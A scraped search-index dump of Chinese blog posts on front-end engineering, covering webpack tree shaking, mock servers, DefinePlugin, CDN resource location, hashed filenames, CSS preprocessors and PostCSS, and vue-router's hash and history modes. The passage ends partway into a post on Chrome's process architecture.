123&quot;sideEffects&quot;: [ &quot;*.vue&quot; ] 有了上述配置， webpack 在处理 .vue 文件的时候， 不会使用 tree shaking， 不会出现样式丢失的问题。但是这种解决方法有一个问题， 如果 script 区域块 中通过 import 的方式引入了 未使用的模块，未使用的模块在最后打包代码的时候不会被删除。 通过 rule.sideEffects 指定 具体的模块 在使用 tree shaking 的时候会有 副作用， 如下: 12345678910111213141516171819202122232425262728// webpackConfig： &#123; test: /\\.css$/, oneOf: [&#123; resourceQuery: /\\?vue/, // 指定.vue文件的 style区域块 使用 tree shaking 时会有副作用 sideEffects: true, use: [isProduction ? MiniCssExtractPlugin.loader : &#x27;vue-style-loader&#x27;, &#x27;css-loader&#x27;] &#125;, &#123; use: [isProduction ? MiniCssExtractPlugin.loader : &#x27;style-loader&#x27;, &#x27;css-loader&#x27;] &#125;] &#125;, &#123; test: /\\.scss$/, oneOf: [&#123; resourceQuery: /\\?vue/, // 指定.vue文件的 style(lang=scss)区域块 使用 tree shaking 时会有副作用 sideEffects: true, use: [isProduction ? MiniCssExtractPlugin.loader : &#x27;vue-style-loader&#x27;, &#x27;css-loader&#x27;, &#x27;sass-loader&#x27;] &#125;, &#123; use: [isProduction ? MiniCssExtractPlugin.loader : &#x27;style-loader&#x27;, &#x27;css-loader&#x27;, &#x27;sass-loader&#x27;] &#125;] &#125; // package.json &#123; sideEffects: false &#125; 上述配置， 明确说明了 .vue 文件 的 style 区域块 在使用 tree shaking 的时候， 会有 副作用，在打包的时候不会删除。这样的话，样式不会丢失， 并且如果 script 区域块 中通过 import 的方式引入了 未使用的模块，未使用的模块在最后打包代码的时候会被删除","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"}],"tags":[]},{"title":"工作流","slug":"工作流","date":"2022-05-09T14:25:05.000Z","updated":"2022-05-09T14:59:46.153Z","comments":true,"path":"2022/05/09/工作流/","link":"","permalink":"https://coloey.github.io/2022/05/09/%E5%B7%A5%E4%BD%9C%E6%B5%81/","excerpt":"","text":"本地工作流本地工作流是本地工具链阶段的前端工程体系所对应的工作模式，此阶段的各个功能模块均由开发人员在本机环境下执行，所有功能模块的两个要素： 执行人：前端开发人员 执行环境：分散的本地开发环境 代码分离与测试沙箱代码分离：基本原则是单独编写一个适应各环境的“配置文件”,假设我们将此文件命名为manifest.js: 12345678const Domain=window.location.host;if(Domain===&#x27;test.app.com&#x27;)&#123; //测试环境 window.ASYNC_API_DOMAIN=&#x27;apitest.app.com&#x27;;&#125;else if(Domain===&#x27;www.app.com&#x27;)&#123; //生产环境 window.ASYNC_DOMAIN=&#x27;api.app.com&#x27;&#125; 将主站域名区分测试环境和生产环境，并将对应的异步API域名以全局变量的形式暴露出来。随后在业务逻辑代码main.app.js中使用全局变量： 1234567$.ajax(&#123; url:`https://$&#123;window.ASYNC_API_DOMAIN&#125;/login`, dataType:&#x27;jsonp&#x27;, success()&#123; &#125;&#125;) manifest.app.js可以作为一个通用模块不参与构建，并且必须在业务js文件之前引入： 123&lt;script type=&quot;text/javascript&quot; src=&quot;//static.app.com/common/manifest.js&quot;&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;//static.app.com/common/main.app.js&quot;&gt; manifest.js作为一个通用模块，无法保证更新后完全兼容历史项目 代码分离的本质是架构层面的细节设计，架构是跟着业务需求的变动而不断改变的，所以manifest.js只能作为一种临时性的解决方法，而不是从工程角度出发的高度可适应方案 测试沙箱测试沙箱的原则是搭建一个仿真的生产环境，在工作流中加入测试沙箱的支持后，前端只需执行一次针对生产环境的构建行为即可，测试通过后可直接部署上线，无需二次构建 测试沙箱只需要模拟一个前端仿真环境，比如实现域名的映射，最原始的方案就是通过修改测试人员本地host文件实现，如果要统一规范可以搭建一个专属的VPN服务，所有参与测试的任意统一使用此VPN代理访问测试沙箱。测试沙箱的复杂度取决于生成环境的复杂度 云平台工作流云平台工作流在本地工作流的基础上，将容易因个体差异产生问题的功能模块（比如构建，部署等）提升到云平台运行，通过严谨的流程控制增强开发规范性，云平台的目标不仅是实现功能的集中管理，而且要在此基础上进一步优化工作流程。功能集中的同时以为着权限集中，这也是实现自动构建和自动部署的必要前提 开发人员负责一线开发工作 开发负责人汇总开发人员的各个分支并将其合并到dev分支 云平台管理人员负责项目的发起以及部署队列的控制","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"}],"tags":[]},{"title":"Mock服务器","slug":"Mock服务器","date":"2022-05-08T14:04:17.000Z","updated":"2022-08-25T02:08:19.545Z","comments":true,"path":"2022/05/08/Mock服务器/","link":"","permalink":"https://coloey.github.io/2022/05/08/Mock%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"动态构建：webpack-dev-middleware:将webpack构建输出的文件存储在内存中，正常情况下，webpack构建产出的文件会存储在output配置项指定的硬盘目录中，webpack-dev-middleware在此基础上建立一个文件映射机制，每当匹配到一个webpack构建产出文件的请求后便会将内存中与其对应的数据返回给发起请求的客户端，由于是内存的文件系统，没有好使的硬盘读写，数据更新很快，这也是webpack相较其他同类工具的优势之一 实际上，webpacl-dev-server是在Express和webpack-dev-middleware基础上进行的封装，但由于不具备Mock服务，我们需要自己封装本地开发服务器，注意： 如何启用源文件的监听并触发动态编译 如何令客户端可访问由HTML引用但是并未参与构建的本地静态文件，比如jQuery等第三方库，这类文件由独立的script标签引入，不参与webpack构建 webpack-dev-middleware配置项： lazy:是否开启惰性模式 watchOptions-监听细节配置（默认） aggregateTimeouy:指定webpack的执行频率，webpack将在此段时间内针对源代码所有修改都聚合到一次重新编译行为中 ignored:指定不参与监听的文件 poll:指定webpack监听无效时轮询检验文件的频率 实际开发中并非所有的静态文件都参与构建，一些常用第三方库通常用单独的script和link标签引入，此类文件不参与构建，不在webpack-dev-middleware的监听范围内，也就不能通过文件映射策略将其对应的请求映射到内存文件系统中，只能借助express内置的static中间件将这些文件作为静态内容开放给Http服务， 1app.use(&#x27;/libs&#x27;,express.static(path.join(process.cwd(),&#x27;static&#x27;))) 第一个参数/libs是客户端请求静态资源的路径，express.static的参数时本地存放静态资源的绝对路径，上述代码将/libs路径的http请求映射到本地项目的static目录 创建一个本地开发服务器：1234567891011121314151617181920212223const express=require(&#x27;express&#x27;)const webpack=require(&#x27;webpack&#x27;)const path=require(&#x27;path&#x27;)const webpackdevmiddleware=require(&#x27;webpack-dev-middleware&#x27;)const app=express()const compiler=webpack(&#123; //webpack配置&#125;)//配置中间件app.use(&#x27;/libs&#x27;,express.static(path.join(process.cwd(),&#x27;static&#x27;))).use(webpackdevmiddleware(compiler,&#123; lazy:false, watchOprtions:&#123; aggregateTimeout:300, ignored:/node_modules/, poll:false &#125;&#125;))app.listen(8888,err=&gt;&#123; if(err)&#123; throw new Error(err) &#125;&#125;) Mock1 假数据2 客户端MockMock进化的第二种形态就是以Mock.js为代表的客户端Mock,工作原理是在客户端拦截JavaScript代码发出的ajax请求并返回由Mock.js创建的假数据 1234567891011121314151617181920212223242526272829303132333435&lt;script src=&quot;/libs/js/mock.js&quot;&gt;&lt;/script&gt;&lt;script&gt; Mock.mock(&#x27;/api&#x27;,&#123; &#x27;code|1&#x27;:&#123; 200, 404, 500 &#125;, &#x27;errMsg|1&#x27;:[ &#x27;资源未找到&#x27;, &#x27;服务器错误&#x27; ], &#x27;data&#x27;:&#123; &#x27;a&#x27;:1 &#125;&#125;)loading=true;$.ajax(&#123; url:&#x27;/api&#x27;, dataType:&#x27;jsonp&#x27;, success(res)&#123; if(res.code===200&amp;&amp;res.response)&#123; data=res.response.data &#125;else&#123; alert(res.errMsg) &#125; &#125;, fail()&#123; alert(&#x27;操作失败&#x27;) &#125;, complete()&#123; loading=false; &#125;&#125;)&lt;/script&gt; Mock.js可以随机创建假数据，还可以处理各种异常状态，然而几遍客户端Mock提供了许多便利，Mock相关代码或文件仍然必须存在于业务代码中，上线之前仍然需要删除，这对于产品质量保障始终存在一定隐患。 3 Mock Server在开发阶段使用Mock Server提供的与真实接口规范和逻辑一致的本地接口进行开发 开发完成后，在构建阶段将Mock的地址修改为已完成的真实服务器端接口地址 Mock Server最普遍的使用场景就是模拟异步数据接口，比如使用Ajax或者JSONP获取和提交数据，模拟的方式通常有两种： Local:本地模式，使用本地JSON数据作为异步接口的请求响应 Proxy：代理模式，将异步接口代理到线上的其他接口地址，类似于转接者角色 Mock Server本质上是一个简化版的Web Server,最基础的组件就是负责分发的路由 Local模式：在开发阶段使用本地API代替真实API地址，使用本地JSON作为接口的返回数据，具体搭建流程： 通过路由创建一个可访问的本地域名API代替真实API，比如使用/login代替http://auth.app.com/login 在路由响应函数内对请求进行校验，比如是否为JSONP请求，然后返回本地JSON数据 前端工程师在开发阶段的业务代码中将http://auth.app.com/login修改为API/login 123456789101112131415const Path=require(&#x27;path&#x27;)const express=require(&#x27;express&#x27;)const app=express()app.get(&#x27;/login&#x27;,(req,res)=&gt;&#123; //path.join(process.cwd())//返回的是当前Node.js进程执行时的工作目录 const MockData=require(path.join(process.cwd(),&#x27;./mockdata.login.js&#x27;)); req.query.callback?res.jsonp(MockData):res.json(MockData); &#125;);app.listen(8888,err=&gt;&#123; if(err)&#123; throw new Error(err) &#125;&#125;) DefinePlugin和环境变量开发环境使用Mock Server将所有真实接口地址修改为本地域名地址，在部署测试和生产环境之前必须将接口的地址复原。 接口地址的修改需求涉及两个方面： 执行环境：开发，测试，生产环境下的接口地址均不同，所以必须能够依据部署目标环境将接口修改为对应地址 字符串修改：对于JavaScript代码来说，接口地址就是一个字符串，我们要做的就是将该字符串修改为指定的值 123456789entry:&#123; &#x27;main.app&#x27;:&#x27;./js/main.app.js&#x27;&#125;, plugins:[ new webpack.DefinePlugin(&#123; AUTH_API_DOMAIN:&#x27;//auth.app.com&#x27;, HMOE_API_DOMAIN:&#x27;//www.app.com&#x27; &#125;) ] 源代码 12345678910//请求位于auth.app.com域名下的login接口$.ajax(&#123; url:`$&#123;AUTH_API_DOMAIN&#125;/login`, success(res)&#123;&#125;&#125;)//请求位于www.app.com域名下的login接口$.ajax(&#123; url:`$&#123;HOME_API_DOMAIN&#125;/login`, success(res)&#123;&#125;&#125;) 经过构建后 12345678910//请求位于auth.app.com域名下的login接口$.ajax(&#123; url:`//auth.app.com/login`, success(res)&#123;&#125;&#125;)//请求位于www.app.com域名下的login接口$.ajax(&#123; url:`//www.app.com/login`, success(res)&#123;&#125;&#125;) 结合环境变量，配置DefinePlugin指定不同环境下的替换值 1234new webpack.DefinePlugin(&#123; AUTH_API_DOMAIN:process.env.NODE_ENV===&#x27;dev&#x27;?&#x27;&#x27;:&#x27;//auth.app.com&#x27;, HOME_API_DOMAIN:process.env.NODE_ENV===&#x27;dev&#x27;?&#x27;&#x27;:&#x27;//www.app.com&#x27;&#125;) 以上代码在开发环境下将接口映射到本地的Mock Server,非开发环境下修改为真实域名的地址","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"}],"tags":[]},{"title":"插件以及资源定位","slug":"资源定位","date":"2022-05-08T02:21:32.000Z","updated":"2022-05-08T03:13:19.824Z","comments":true,"path":"2022/05/08/资源定位/","link":"","permalink":"https://coloey.github.io/2022/05/08/%E8%B5%84%E6%BA%90%E5%AE%9A%E4%BD%8D/","excerpt":"","text":"CDNCDN（Connect Delivery Network)是一种部署策略，包括分布式存储，负载均衡，内容管理等模块，CDN的一个重要功能是将静态资源缓存到用户近距离的CDN节点上，不但能提高用户对静态资源的访问速度，还能节省服务器的带宽消耗，降低负载。实现此功能的一个重要前提是将静态资源部署到已接入CDN的专属服务器，而这类服务器通常与Web主页面处于不同域名下，这样做的主要目的是为了充分利用浏览器的并发请求能力，提高页面的加载速度。 webpack的逆向注入模式1234567891011121314151617181920212223242526272829303132&#123; entry:&#123; &#x27;main.app&#x27;:&#x27;./js/main.app.js&#x27; &#125;, output:&#123; path:&#x27;./dist&#x27;, filename:&#x27;[namr].[chunkhash].js&#x27;, publicPath:&#x27;//static.app.com/app/&#x27; &#125;, module:&#123; rules:[&#123; test:/\\.js$/, loader:&#x27;babel-loader&#x27; &#125;,&#123; test:/\\.css$/, use:ExtractTextPlugin.extract(&#123; use:&#x27;css-loader&#x27; &#125;) &#125;, ] &#125;, plugins:[ newExtractTextPlugin(&#123; filename:&#x27;style/[name].[chunkhash].css&#x27;, &#125;), new HtmlWebpackPlugin(&#123; filename:&#x27;index.html&#x27;, template:&#x27;index.html&#x27;, inject:true &#125;) ]&#125; index.html源码没有引用main.app.css的标签和main.app.js的script标签，然而构建后的文档内容被注入了对应的引用标签并且引用地址为构建之后的资源地址 构建之后的资源地址被修改为带有CDN服务器域名和路径信息的完整URL，并且CDN的信息与配置中的publicPath一致，这是webpack提供的可用于指定静态资源CDN服务器信息的配置项 多页面项目资源定位 编写一个html-wepack-plugin-before-html-processing插件，保证在html-wepack-plugin-before-html-processing阶段能够执行以下行为： 获得静态资源构建后的URL 获得并且修改HTML文档的内容 编写webpack组件，清楚两个对象：compiler和compilationcompiler对象代表的是webpack执行环境的完整配置，只会在启动webpack时被创建，并且在webpack运行期间不会被修改 compilation对象代表某个版本的资源对应的编译进程，当使用webpack的development中间件时，每次检测到项目文件有改动会创建一个compilation，进而能够针对改动生产全新的编译文件，compilation对象包含当前模块资源，待编译文件，有改动的文件和监听依赖的所有信息 编写一个构造函数用于接收配置： 123456789101112const HtmlWebpackPluginForLocate=function(options)&#123; this.options=&#123;...options&#125;//options用来提供给用户配置插件功能的细节&#125;//针对指定事件阶段编写apply方法HtmlWebpackPluginForLocate.prototype.apply=compiler=&gt;&#123; compiler.plugin(&#x27;compilation&#x27;,compilation=&gt;&#123; compilation.plugin(&#x27;html-webpack-plugin-before-html-processing&#x27;,(htmlPluginData,callback)=&gt;&#123; //插件行为逻辑 &#125;) &#125;)&#125; html-webpack-plugin-before-html-processing阶段捕获两个对象，callback的作用类似于Express中间件中的next函数，执行完当前插件的逻辑后必须调用callback以便进入后序流程，它属于webpack流程控制的一部分，没有构建相关的信息","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"},{"name":"webpack","slug":"前端工程化/webpack","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack/"}],"tags":[]},{"title":"覆盖更新与增量更新","slug":"覆盖更新与增量更新","date":"2022-05-07T14:21:34.000Z","updated":"2022-05-08T02:20:39.908Z","comments":true,"path":"2022/05/07/覆盖更新与增量更新/","link":"","permalink":"https://coloey.github.io/2022/05/07/%E8%A6%86%E7%9B%96%E6%9B%B4%E6%96%B0%E4%B8%8E%E5%A2%9E%E9%87%8F%E6%9B%B4%E6%96%B0/","excerpt":"","text":"覆盖更新实现方案是在引用资源的URL后添加请求参数，比如添加时间戳参数， 浏览器会将参数不同的URL视为全新的URL，所以浏览器向服务器请求并下载最新资源，我们只更新修改了的资源，为了避免手动改参数，将hash指纹（通过mds算法得到）作为URL的v参数 12345&lt;head&gt; &lt;link rel=&#x27;stylesheet&#x27; href=&quot;main.home.css?v=858d5483&quot;&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;main.home.js?v=bbcadaf73&quot;&gt;&lt;/script&gt; &lt;/head&gt; 缺点： 必须保证html文件与改动的静态文件同步更新，否则会出现资源不同步的情况。如果是无服务端渲染的项目，html文件被视为金泰之源，并且与其他今天资源(js/css/图片等)部署到同一台服务器，在这种情况下，我们可以保证资源的同步更新，不会受到覆盖更新的影响。但是对于依赖服务端渲染的项目，大多数的部署方式是将网站的入口HTML和静态资源分开部署，比如，HTML与服务器代码一同部署到域名为ww.app.com对应的服务器，把JS/CSS等静态资源部署到static.app.com对应的服务器，两种资源分开部署必然有先后顺序，这就意味着两种资源的上线存在时间差，不论先部署哪种资源无法保证所有用户访问页面的正确性，即使时间差小，对于淘宝这种访问量庞大的网站来说也会影响用户群，这就是为什么很多团队总是选择在半夜或者凌晨这种访问量较小的时间段发布新版本的原因之一 不利于版本回滚。由于覆盖更新每次迭代之后的资源都会覆盖服务器上原有的旧版本文件，这对于版本回滚操作很不友好，运维人员吗要么借助于服务器本身的缓存机制要么拿到旧版本文件再次覆盖 增量更新将原本作为参数值的hash指纹作为资源文件名的一部分并且删除用于更新的url参数 12345&lt;head&gt; &lt;link rel=&#x27;stylesheet&#x27; href=&quot;main.home.858d5483.css&quot;&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;main.home.bbcadaf73.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; 在静态资源使用增量更新前提下可以将静态资源先于动态HTML部署，此时静态资源没有引用入口，不会对线上环境产生影响；动态HTML部署后即可在第一时间访问已存的最新静态资源。解决覆盖更新部署同步问题 增量更新修改了资源文件名，不会覆盖已存的旧版本文件，运维人员进行回滚操作只需回滚HTML即可，优化了版本控制，支持多版本共存 按需加载与多模块架构场景的增量更新假设一个页面有主模块main.app.js,同步模块module.sync.js，构建后与主模块合并为主文件的main.app.[hash].js，同步加载，异步模块module.async.js,构建后为异步文件app.async.[hash].js 缺陷：当更新异步文件的hash指纹，主文件的hash没有同步修改，不能获取到最新资源 解决： webpack中的chunkhash： hash与chunkhash: hash:the hash of compilation,webpack的compilation对象代表某个版本资源对应的编译进程，当使用webpack的development中间件，每次检测到项目文件有改动就会创建一个compilation,进而能够针对改动生产全新的编译文件。compilation对象不是针对单个文件，是针对项目中所有参与构建的文件，只要任何一个文件改动，compilation对象就改变，作为compilation的hash值就相应改变，因此不论同步文件还是异步文件构建输出后均有相同hash，显然不合理 chunk在webpack中含义可以理解为散列模块经合并后的“块”，比如同步模块module.sync.js和主模块main.app.js合并为一个“块”，异步模块module.async.js是另一个块，chunkhash就是一个个块依据自身代码内容计算所得的hash值。 1234output:&#123; filename:&#x27;[name].[chunkhahs:8].js&#x27;&#125; 主文件 异步文件 原始状态 main.app.8d136fcd.js app.async.67fa68a0.js 修改主模块main.app.js hash改变 hash不变 修改同步模块modue.sync.js hash改变 hash不变 修改异步模块module.async.js hash改变 hash改变 contenthash webpack默认将CSS代码合并到js文件，要把CSS文件抽离处理独立维护，既有利于浏览器的渲染优化，又能够更好利用客户端缓存 123456789101112131415&#123; test:/\\.css$/, use:ExtractTextPlugin.extract(&#123; filename:&#x27;./dest/[name].[contenthash:8].css&#x27; use:[&#123; loader:&#x27;css-loader&#x27;, options::&#123; importLoaders:2 &#125; &#125;], publishPath:&#x27;/&#x27; &#125;) &#125; contenthash就是解耦js与css文件hash指纹的关键，contenthash是由ExtractTextPlugin插件提供，代表被导出内容计算后的hash值，如果不用contenthash,main.app.css不会参与chunk的chunkhash计算，但也不会作为一个独立的Chunk进行单独计算，编译后的css文件取值与主文件相同 使用contenthash: 主文件hash 异步文件hash CSS文件hash 修改主模块 变 不变 不变 修改同步模块 变 不变 不变 修改异步模块 不变 变 不变 修改CSS 不变 不变 变","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"}],"tags":[]},{"title":"css预编译器","slug":"css预编译器","date":"2022-05-07T09:42:43.000Z","updated":"2022-05-07T10:11:32.526Z","comments":true,"path":"2022/05/07/css预编译器/","link":"","permalink":"https://coloey.github.io/2022/05/07/css%E9%A2%84%E7%BC%96%E8%AF%91%E5%99%A8/","excerpt":"","text":"CSS的弱编程能力，CSS通过”delector-properties”的模式为HTML文档增加样式，但CSS不支持嵌套，运算，变量，复用等。 CSS预编译器原理：提供便捷的语法和特性供开发者编写源代码，随后经过专门的编译工具将源代码转化为CSS语法，最早的CSS预编译器是2007年起源于Ruby on Rails社区的SASS，目前不叫流行的如LESS,Stylus在一定程度上收到SASS影响 CSS预编译器提升了CSS开发效率：1 增强编程能力 2 增强源码可复用性，让CSS开发符合DRY(Don’t repeat yourself)的原则 3 增强源码可维护性 4 更便于解决浏览器兼容性 实现 嵌套 变量 mixin/继承 运算 模块化 嵌套是所有预编译器都支持的语法特性，mixin/继承是为了解决hack和代码复用，变量和运算增强了源码的可编程能力；模块化的支持不仅更利于代码复用，同时提高了源码的可维护性 PostCSSPostCSS鼓励开发者使用规范的CSS原生语法编写源代码，然后配置浏览器需要兼容的浏览器版本，最后经过编译将源码转化为目标浏览器可用的CSS代码。PostCSS提供了丰富的插件用于实现不同场景的编译需求，最常用的比如autoprefix,Sprited等 PostCSS不是另一种CSS预编译器，与SASS LESS等预编译器不冲突，目前普遍方案将CSS预编译与PostCSS综合： 使用CSS预编译器弥补CSS源码的弱编程能力。比如变量，运算，继承等 使用PostCSS处理针对浏览器的需求，比如autoprefix,自动CSS Sprites webpack结合预编译与PostCSS实现CSS构建 123456789101112131415161718192021222324&#123; test:/\\.less$/ use:[&#123; loader:&#x27;style-loader&#x27;, options:&#123;&#125;//style-loader options &#125;, &#123; loader:&#x27;css-loader&#x27;, options:&#123; importLoaders:2//css-loader options &#125; &#125;, &#123; loader:&#x27;postcss-loader&#x27;, options:&#123;&#125;//postcss-loader &#125; &#123; loader:&#x27;less-loader&#x27;, options:&#123;&#125;//less-loader options &#125; ]&#125; css-loader中的importLoaders选项的作用是：用于配置css-loader作用于@import的资源之前需要经过的其他loader的个数，@import用于CSS源码中引用其他模块的关键字，如果你的项目中确定不会涉及到模块化，可以忽略此配置项 如果需要将编译后的css文件独立导出，则需将style-loader替换为extract-text-webpack-plugin 12345678910111213141516171819202122232425262728&#123; test:/\\.less$/ use:ExtractTextPlugin.extract(&#123; use:[&#123; loader:&#x27;style-loader&#x27;, options:&#123;&#125;//style-loader options &#125;, &#123; loader:&#x27;css-loader&#x27;, options:&#123; importLoaders:2//css-loader options &#125; &#125;, &#123; loader:&#x27;postcss-loader&#x27;, options:&#123;&#125;//postcss-loader &#125; &#123; loader:&#x27;less-loader&#x27;, options:&#123;&#125;//less-loader options &#125;], publicPath:&#x27;/&#x27; &#125; &#125;) 区分css-loader和style-loadercss-loader:用于解析css源文件并获得其引用资源，比如@import引用的模块，url()引用的图片等，然后根据webpack配置编译这些资源 style-loader:负责将CSS代码通过style标签插入HTML文档中，所以如果独立导出CSS文件就不再需要style-loader，css-loader必须在style-loader之前执行","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"}],"tags":[]},{"title":"vue-router中hash模式和history模式区别","slug":"vue-router中hash模式和history模式区别","date":"2022-05-06T10:26:08.000Z","updated":"2022-05-06T14:31:27.082Z","comments":true,"path":"2022/05/06/vue-router中hash模式和history模式区别/","link":"","permalink":"https://coloey.github.io/2022/05/06/vue-router%E4%B8%ADhash%E6%A8%A1%E5%BC%8F%E5%92%8Chistory%E6%A8%A1%E5%BC%8F%E5%8C%BA%E5%88%AB/","excerpt":"","text":"vue-router的本质：路由就是SPA（单页应用）的路径管理器，vue-router的单页应用中，则是路径之间的切换，也就是组件的切换，路由模块的本质就是建立起url和页面之间的映射关系 为什么不能用a标签，这是因为Vue左的是单页应用，当你的项目准备打包时，会生成dist文件夹，这里面只有静态资源和一个index.html页面，所有a标签跳转页面不起作用 单页应用的核心之一就是：更新视图而不重新请求页面，vue-router在实现单页面前端路由时，提供两种方式：Hash模式和History模式，根据mode参数来决定使用哪一种 Hash模式vue-router默认hash模式，使用URL的hash模拟一个完整的URL,于是URL改变时，页面不会重新加载，hash(#)是URL的锚点，代表网页中的一个位置，单单改变#后的部分，浏览器只会滚动到相应位置，不会重新加载页面，也就是hash出现在URL中（#后面的值），但不会被包含在http请求中，对后端没有影响，因此改变hash不会重新加载页面；同时每一次改变#后的部分，都会在浏览器的访问历史中增加一个记录，使用“后退”按钮，就可以回到上一个位置，所以Hash模式通过锚点值的改变，根据不同的值，渲染指定DOM位置的不同数据，hash模式原理是onhashchange事件(监测hash值变化)，可以在window对象上监听这个事件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768class Router&#123; constructor()&#123; //存储hash与callback键值对 this.routes=&#123;&#125;; //当前hash this.currentUrl=&quot;&quot;; //记录出现过的hash this.history=[]; //作为指针，默认指向this.history的末尾，根据后退前进指向history中不同的hash this.currentIndex=this.history.length-1; this.refresh=this.refresh.bind(this); this.backoff=this.backoff.bind(this) //默认不是后退操作 this.isBack=false window.addEventListener(&#x27;load&#x27;,this.refresh,false) window.addEventListener(&#x27;hashchange&#x27;,this.refresh,false) &#125; route(path,callback)&#123; this.routes[path]=callback||function()&#123;&#125; &#125; refresh()&#123; //不能包括&#x27;#&#x27; this.currentUrl=location.hash.slice(1)||&#x27;/&#x27;; //不是后退操作 if(!this.isBack)&#123; //如果当前指针小于数组总长度，直接截取之前的部分储存下来，避免点击后退按钮后指针后移一位，当再次正常跳转时，指针前进一位， //而在数组中添加新hash路由 //导致指针和路由不匹配 if(this.currentIndex&lt;this.history.length-1)&#123; this.history=this.history.slice(0,this.currentIndex+1) &#125; this.history.push(this.currentUrl) this.currentIndex++; &#125; this.routes[this.currentUrl]() this.isBack=false; &#125; backoff()&#123; this.isBack=true this.currentIndex&lt;=0 ?(this.currentIndex=0) :(this.currentIndex=this.currentIndex-1) //找到后退后的哈希地址 location.hash=`#$&#123;this.history[this.currentIndex]&#125;` //调用后退后的地址对应的函数 this.routes[this.history[this.currentIndex]] &#125;&#125;window.Router=new Routers()const content=document.querySelector(&#x27;body&#x27;)const button=document.querySelector(&#x27;button&#x27;)function changeBgColor(color)&#123; content.style.background=color&#125;Router.route(&#x27;/blue&#x27;,function()&#123; changeBgColor(&#x27;blue&#x27;)&#125;)Router.route(&#x27;/green&#x27;,function()&#123; changeBgColor(&#x27;green&#x27;)&#125;)Router.route(&#x27;/red&#x27;,function()&#123; changeBgColor(&#x27;red&#x27;)&#125;)button.addEventListener(&#x27;click&#x27;,Router.backoff,false) history模式hash模式在url中自带#,比较丑，可以用路由的history模式，只需要在配置路由规则时，加上’mode:history’ 这种模式利用了html5 history Interface中新增的pushState()和replaceState()方法，这两个方法应用于浏览器记录栈，在当前已有的back,forwarc,go基础上，它们提供了对历史记录修改的功能，只是当修改时，虽然改变了当前的URL，但浏览器不会去请求服务器该路径下的资源，一旦刷新就会暴露，显示404，因此这种模式下需要后端的支持，在服务端增加一个覆盖所有情况的候选资源：如果URL匹配不到任何静态资源，就返回一个Index.html页面，这个页面就是app依赖的页面 export const routes=[ ​ {path:”*”,redirect:’/‘} ] history.pushState用于在浏览器中添加历史记录，但不触发跳转，此方法接收三个参数： state:一个与指定网址相关的状态对象，popstate事件触发时，该对象会传入回调函数，不需要这个对象时此处就填null title:新页面标题，但是所有浏览器目前都忽略这个值，因此这里填null url:新的网址，必须与当前页面处在同一个域，浏览器的地址栏将显示这个网址 新标准下路由的实现 123456789101112131415161718192021222324252627282930313233343536373839404142class Router&#123; constructor()&#123; this.routes=&#123;&#125;; this.bindPopState(); &#125; init(path)&#123; history.replaceState(&#123;path:path&#125;,null,path) this.routes[path]&amp;&amp;this.routes[path]() &#125; route(path,callback)&#123; this.routes[path]=callback||function()&#123;&#125; &#125; go(path)&#123; history.pushState(&#123;path:path&#125;,null,path) this.routes[path]&amp;&amp;this.routes[path]() &#125; _bindPopState()&#123; window.addEventListener(&#x27;popstate&#x27;,e=&gt;&#123; const path=e.state&amp;&amp;e.state.path; this.routes[path]&amp;&amp;this.routes[path]() &#125;) &#125;&#125;window.Router = new Routers();Router.init(location.pathname);const content = document.querySelector(&#x27;body&#x27;);const ul = document.querySelector(&#x27;ul&#x27;);function changeBgColor(color) &#123; content.style.backgroundColor = color;&#125;Router.route(&#x27;/&#x27;, function() &#123; changeBgColor(&#x27;yellow&#x27;);&#125;);Router.route(&#x27;/blue&#x27;, function() &#123; changeBgColor(&#x27;blue&#x27;);&#125;);Router.route(&#x27;/green&#x27;, function() &#123; changeBgColor(&#x27;green&#x27;);&#125;);","categories":[],"tags":[]},{"title":"浏览器工作原理","slug":"浏览器工作原理","date":"2022-05-05T15:35:02.000Z","updated":"2022-08-23T03:30:29.603Z","comments":true,"path":"2022/05/05/浏览器工作原理/","link":"","permalink":"https://coloey.github.io/2022/05/05/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","excerpt":"","text":"一、 Chrome架构：仅仅打开了一个页面，为什么有4个进程？线程 VS 进程 多线程可以并行处理任务，但是线程是不能单独存在的，它是由进程来启动和管理的。 那什么又是进程呢？一个进程就是一个程序的运行实例。详细解释就是，启动一个程序的时候，操作系统会为该程序创建一块内存，用来存放代码、运行中的数据和一个执行任务的主线程，我们把这样的一个运行环境叫进程。 从图中看出，线程是依附于进程的，而进程中使用多线程并行能提高运算效率 总结： 进程中的任一线程执行出错，都会导致整个进程的崩溃 线程之间共享进程中的数据。 3. 当一个进程关闭之后，操作系统会回收进程所占用的内存 \\4. 进程之间的内容相互隔离 目前浏览器的多进程架构 最新的chrome浏览器包括： 1个浏览器主进程，1个GPU进程，1个网络进程，多个渲染进程和多个插件进程。 分析这几个进程的功能： 浏览器进程： 主要负责界面展示，用户交互，子进程管理，同时提供存储等功能。 渲染进程： 核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，排版引擎 Blink 和 JavaScript 引擎 V8 都是运行在该进程中，默认情况下，Chrome 会为每个 Tab 标签创建一个渲染进程。出于安全考虑，渲染进程都是运行在沙箱模式下。 GPU进程 